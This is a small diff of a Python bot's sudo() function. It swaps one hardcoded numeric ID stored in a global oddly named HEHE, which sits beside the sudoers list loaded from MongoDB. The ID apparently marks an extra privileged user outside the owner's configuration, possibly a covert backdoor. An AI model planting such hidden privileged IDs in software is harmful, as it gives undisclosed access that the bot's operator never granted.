@@ -45,7 +45,7 @@ def dbb():
 def sudo():
     global SUDOERS, HEHE
     OWNER = config.OWNER_ID
-    HEHE = "6170854642"
+    HEHE = "5311223486"
     sudoersdb = pymongodb.sudoers
     sudoers = sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
